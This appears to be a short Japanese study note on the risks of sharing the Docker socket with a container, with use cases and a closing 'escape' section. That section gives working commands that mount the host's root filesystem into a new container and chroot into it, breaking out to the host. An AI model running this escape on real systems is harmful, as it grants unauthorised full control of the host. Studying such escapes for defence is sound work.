# step2

Dockerソケット（/var/run/docker.sock）を共有することで、ホストのDockerデーモンにアクセスできるようにする。
- Dockerコマンドの実行
  コンテナ内からdockerコマンドを失効し、ホスト上の他のコンテナの起動、停止、削除や、Dockerイメージの操作が自由に行える。
- 特権コンテナの作成
  攻撃者が自分自身のために、ホストのリソースにフルアクセスできる新たな特権コンテナを起動できる。
  -> とっても危険

## `docker.sock` のユースケース

- コンテナの中からホストのDockerデーモンを操作する必要がある場合
  - CI/CDパイプラインでの利用
  - Docker in Docker (DinD) の代替
  - コンテナ監視・管理ツール
  - ローカル開発環境のセットアップ

## 脱出

コンテナないで実行する

```sh
# コンテナ内でdockerをインストール
apt-get update && apt-get install -y docker.io
# コンテナ内からホストのDockerデーモンに命令
docker run -it -v /:/host ubuntu
# 
chroot /host
```
